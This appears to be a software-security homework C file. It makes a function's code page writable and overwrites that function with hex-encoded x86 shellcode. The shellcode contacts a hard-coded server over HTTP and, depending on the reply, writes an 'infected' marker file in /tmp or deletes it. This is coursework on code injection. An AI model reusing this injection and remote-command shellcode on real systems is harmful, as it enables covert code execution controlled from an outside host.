/// CS492e homework.
// 20226189 - KAU Anthony Mathieu

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

void dummy(void) {
    
    int i=0;
    i++;
    printf("%d: you should put enough dummy code here\n", i);
    i++;
    printf("%d: in order to safely overwrite it with your own\n", i);

    for(int iterator = 0; iterator <= 500; iterator++){
        printf("We are in the iteration : %d of the for loop \n", iterator);

        if (iterator == 4){
            printf("That's not a lucky number in china\n");
        }
        else if (iterator == 13){
            printf("Hope it is not a friday\n");
        }
        
        else if (iterator == 42){
            printf("Is this number the answer to everything ?\n");
        }
        else if (iterator == 50){
            printf("1/10 of the loop has been done already\n");
        }
        else if (iterator == 66){
            printf("Famous road in the united States\n");
        }
        else if (iterator == 77){
            printf("Let's make an insertion sort in ascending order\n");
            int array1[] = {4, 13, 99, 50, 10, -10, 777, 100, 1, 492, 42};
            int size1 = sizeof(array1) / sizeof(array1[0]);
            
            int iter, temp, j;
            for (iter = 1; iter < size1; iter++){
                temp = array1[iter];
                j = iter - 1;

                while (j >= 0 && array1[j] > temp){
                    array1[j + 1] = array1[j];
                    j = j - 1;
                }
                array1[j+1] = temp;
            }

            for (iter = 0; iter < size1; iter++){
                printf("%d ", array1[iter]);
            }
            printf("\n");
        }
        else if (iterator == 100){
            printf("2/10 of the loop has been done already\n");
        }
        
        else if (iterator == 125){
            printf("What is this ?\n");

            int n = iterator;
            while(n > 1){
                if(n % 2 == 0){
                    n = n / 2;
                    printf("%d\n", n);
                }
                else{
                    n = n * 3 + 1;
                    printf("%d\n", n);
                }
            }
        }
        else if (iterator == 150){
            printf("3/10 of the loop has been done\n");

        }
        else if (iterator == 177){
            printf("Time for bubble sort\n");
            int array2[] = {54, 52, 12, 64, 754, 231, 342, 6432, 10, 1231};
            int size2 = sizeof(array2) / sizeof(array2[0]);
            
            for (int step = 0; step < size2 - 1; step++){
                for (int i = 0; i < size2 - step - 1; i++){
                    if (array2[i] > array2[i + 1]){
                        int temp2 = array2[i];
                        array2[i] = array2[i+1];
                        array2[i+1] = temp2;
                    }
                }
                
            }
            for (int i = 0; i < size2; ++i) {
                printf("%d  ", array2[i]);
            }
            printf("\n");
        }
        else if (iterator == 200){
            printf("4/10 of the loop has been done\n");

        }
        else if (iterator == 225){
            if (iterator >= 10){
                printf("What is the point of this condition ?");
            }

        }
        else if (iterator == 250){
            printf("halfway done done\n");
        }
        else if (iterator == 277){
            printf("Let's calculate some factorial\n");
            unsigned long long fact = 1;
            int n = 5;
            for (i = 1; i <= n; i++){
                fact *= i;
            }
            printf("Factorial of %d = %llu\n", n, fact);
        }
        else if (iterator == 300){
            printf("6/10 of the loop has been done\n");

        }
        else if (iterator == 333){
            printf("Let's calculate the area of a square\n");
            float side, area;
            side = 10;
            area = side * side;
            printf("Area of square of side %f is %0.04f\n ", side, area);

        }
        else if (iterator == 350){
            printf("7/10 of the loop has been done\n");

        }
        else if (iterator == 333){
            printf("Let's calculate the sum of the Natural numbers for this iter\n");
            int sum;
            for (i = 1; i <= iterator; i++){
                sum += i;
            }
            printf("Sum of the naturals numbers to %d is %d", iterator, sum);
        }
        else if (iterator == 400){
            printf("8/10 of the loop has been done\n");

        }
        else if (iterator == 444){
            printf("After the square, here comes the rectangle\n");
            float length, width, area2;
            length = 10;
            width = 15;
            area2 = length * width;
            printf("Area of rectangle of length = %f and width = %f is %f\n", length, width, area2);
        }
        else if (iterator == 450){
            printf("9/10 of the loop has been done\n");

        }
        else if (iterator == 492){
            printf("Softsec is really hard !\n");

        }
        else if (iterator == 500){
            printf("Wow looks like we are done\n");

        }
        
    }
}

int make_writable(void *addr) {
    int page_size = getpagesize();
    addr -= (unsigned long)addr % page_size;

    if(mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        return -1;
    }

    return 0;
}

int main(void) {
    void *dummy_addr = (void*)dummy;

    if(make_writable(dummy_addr) == -1) {
        fprintf(stderr, "Failed to change perm.\n");
        return 1;
    }

    char realcode[] = /* FIXME */
        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
        "\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1"
        "\xcd\x80\x89\xc7\xb8\x8f\xf8\x26\xd4\x52"
        "\x52\x50\x66\x68\x00\x50\x66\x6a\x02\x89"
        "\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a"
        "\x10\x56\x57\x89\xe1\xcd\x80\x31\xc0\x31"
        "\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x09\x68"
        "\x0d\x0a\x0d\x0a\x68\x2f\x31\x2e\x30\x68"
        "\x48\x54\x54\x50\x68\x74\x78\x74\x20\x68"
        "\x39\x32\x65\x2e\x68\x2f\x63\x73\x34\x68"
        "\x47\x45\x54\x20\x89\xe6\x52\x6a\x1c\x56"
        "\x57\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x31"
        "\xc9\x31\xd2\xb0\x03\x66\xba\x27\x10\x89"
        "\xf1\x89\xfb\xcd\x80\x8b\x8e\xf7\x00\x00"
        "\x00\x31\xc0\x66\xb8\x30\x0a\x66\x39\xc8"
        "\x74\x41\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
        "\xb0\x08\x52\x66\xb9\xff\x01\x68\x34\x39"
        "\x32\x65\x68\x70\x2f\x63\x73\x68\x2f\x2f"
        "\x74\x6d\x89\xe3\xcd\x80\x31\xc9\xb0\x05"
        "\xb1\x02\x53\xcd\x80\x89\xc3\xb0\x04\x68"
        "\x63\x74\x65\x64\x68\x69\x6e\x66\x65\x89"
        "\xe1\xb2\x08\xcd\x80\xeb\x48\x31\xc0\x31"
        "\xdb\x31\xc9\x31\xd2\x50\x68\x34\x39\x32"
        "\x65\x68\x70\x2f\x63\x73\x68\x2f\x2f\x74"
        "\x6d\x89\xe3\x53\xb0\x05\xb1\x02\xcd\x80"
        "\x6a\x04\x8b\x14\x24\x39\xd0\x75\x1e\x31"
        "\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0a\x51"
        "\x68\x34\x39\x32\x65\x68\x70\x2f\x63\x73"
        "\x68\x2f\x2f\x74\x6d\x89\xe3\xcd\x80\x31"
        "\xc0\xb0\x01\xb3\x01\xcd\x80";
    
    memcpy(dummy_addr, realcode, sizeof(realcode)-1);

    dummy();
    return 0;
}
